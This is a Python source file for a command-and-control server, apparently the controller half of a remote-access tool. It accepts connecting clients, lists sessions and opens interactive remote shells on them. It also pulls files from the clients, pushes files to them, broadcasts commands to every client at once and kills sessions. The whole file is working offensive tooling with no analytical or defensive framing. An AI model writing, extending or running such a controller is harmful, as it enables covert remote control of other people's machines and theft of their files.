import os
import socket
import threading


CLIENT_LIST = []  # appending the clients socks
CLIENTIP_LIST = []  # appending the clients IPs
IP = "127.0.0.1"
PORT = 8999
STOP_FLAG = False  # for breaking the 'accept_clients' function
QUIT = "quit"  # for killing all the clients


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((IP, PORT))
server.listen(5)


# Accept incoming clients and append their sock and IP to the specified list
def accept_clients():
    print("Waiting for incoming clients...")
    while True:
        if STOP_FLAG:
            break
        server.settimeout(2)
        try:
            client_soc, c_ip = server.accept()
            CLIENT_LIST.append(client_soc)
            CLIENTIP_LIST.append(c_ip)
            print(f"New client made connection: {str(c_ip[0])}")
        except:
            pass

thread1 = threading.Thread(target=accept_clients).start()


# A function tha send the data to client.
def send_to_client(cli_sock, data_for_client):
    cli_sock.send(data_for_client.encode())


# receive the command output
def receive_data_from_client(session_sock):
    data = ""
    while True:
        try:
            data = data + session_sock.recv(1024).decode().rstrip()
            return data
        except ValueError:
            continue


def download_from_client(session_sock, file_path):
    split_path = file_path.split("/")[-1]
    f = open(split_path, 'wb')
    session_sock.settimeout(1)
    chunk = session_sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = session_sock.recv(1024)
        except socket.timeout as e:
            break
    session_sock.settimeout(None)
    f.close()


def upload_to_client(session_sock, file_path):
    file = open(file_path, "rb")
    session_sock.sendall(file.read())


# This function sending/executing commands and receiving their outputs from clients.
def client_handler(session_sock, session_ip):
    while True:
        Command = input(f"{str(session_ip[0])} #: ")
        send_to_client(session_sock, Command)
        if Command == "quit":
            CLIENT_LIST.remove(session_sock)
            CLIENTIP_LIST.remove(session_ip)
            break
        elif Command == "back":
            break
        elif Command == "clear":
            if os.name == "nt":     # Windows
                os.system("cls")
            else:                   # Unix/Linux/Mac
                os.system("clear")
        elif Command[:3] == "cd ":
            pass
        elif Command == "":
            pass
        elif Command[:8] == "download":
            download_from_client(session_sock, Command[9:])
        elif Command[:6] == "upload":
            if os.path.isfile(Command[7:]):
                upload_to_client(session_sock, Command[7:])
            else:
                print("Please!, provide a regular file path.")
        else:
            received_data = receive_data_from_client(session_sock)
            print(received_data)


while True:
    command = input("C2$: ")
    if command == "sessions":
        counter = 0
        for ip in CLIENTIP_LIST:
            print(f"Session {str(counter)} ----> {str(ip)}")
            counter += 1
    elif command == "clear":
        if os.name == "nt":     # Windows
            os.system("cls")
        else:                   # Unix/Linux/Mac
            os.system("clear")
    elif command[:5] == "shell":
        try:
            session_id = int(command[6:])
            session_sock = CLIENT_LIST[session_id]
            session_ip = CLIENTIP_LIST[session_id]
            client_handler(session_sock, session_ip)
        except:
            print("No!, Session under that ID number.")
    elif command == "exit":  # destroy all (server/clients)
        response = input("Are you sure!\nto stop C2 and kill all the connected clients(yes/no): ")
        if response == "yes".lower():
            for client in CLIENT_LIST:
                send_to_client(client, QUIT)
            server.close()
            STOP_FLAG = True
            break
        elif response == "no".lower():
            continue
        else:
            print("Something wrong happen in the process of quitting!")
    elif command[:4] == "kill":  # to kill a specific client.
        cli_id = CLIENT_LIST[int(command[5:])]
        cli_ip = CLIENTIP_LIST[int(command[5:])]
        cli_id.close()
        CLIENT_LIST.remove(cli_id)
        CLIENTIP_LIST.remove(cli_ip)
    elif command[:7] == "sendall":
        x = len(CLIENT_LIST)
        print(f"The total connected clients: {x}")
        i = 0
        try:
            while i < x:
                client_number = CLIENT_LIST[i]
                send_to_client(client_number, command[8:])
                print(f"The {command} execute on {CLIENTIP_LIST[i]}")
                i += 1
        except:
            print(f"The {command} failed!, to execute on {client_number}")
    elif command == "":
        continue
    else:
        print("[!] Please provide a valid command OR look it help file.")
